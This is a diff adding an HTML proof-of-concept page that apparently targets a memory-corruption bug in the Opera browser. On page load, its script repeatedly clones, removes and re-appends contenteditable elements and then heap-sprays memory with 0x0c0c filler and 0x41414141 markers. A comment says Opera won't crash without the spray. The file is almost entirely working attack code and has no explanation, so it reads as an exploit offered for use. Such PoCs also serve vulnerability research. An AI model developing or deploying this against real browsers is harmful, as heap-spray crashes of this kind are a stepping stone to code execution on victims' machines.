@@ -1,0 +1,41 @@
+&lt;html&gt;
+&lt;head&gt;
+&lt;script&gt;
+
+function spray() {
+for(S=&quot;\u0c0c&quot;,k=[],y=0;y++&lt;197;)y&lt;20?S+=S:k[y]=[S.substr(22)+&quot;\u4141\u4141&quot;].join(&quot;&quot;)
+
+}
+
+function crash(){
+// Clone Object -&gt; Remove Object - &gt; Append Reference)
+obj = document.body.children[0].cloneNode(true)
+document.body.removeChild(document.body.children[0])
+document.body.appendChild(obj)
+
+// Clone Object -&gt; Remove Object - &gt; Append Reference)
+obj = document.body.children[0].cloneNode(true)
+document.body.removeChild(document.body.children[0])
+document.body.appendChild(obj)
+
+// Clone Object -&gt; Remove Object - &gt; Append Reference)
+obj = document.body.children[0].cloneNode(true)
+document.body.removeChild(document.body.children[0])
+document.body.appendChild(obj)
+
+// Clone Object -&gt; Remove Object - &gt; Heap Spray
+
+obj = document.body.children[1].cloneNode(true)
+document.body.removeChild(document.body.children[1]);
+spray(); // if this is removed Opera won&#039;t crash
+}
+
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body onload=&quot;crash();&quot;&gt;
+
+&lt;em contenteditable=&quot;true&quot;&gt;a&lt;/em&gt;
+&lt;strong contenteditable=&quot;true&quot;&gt;a&lt;/strong&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
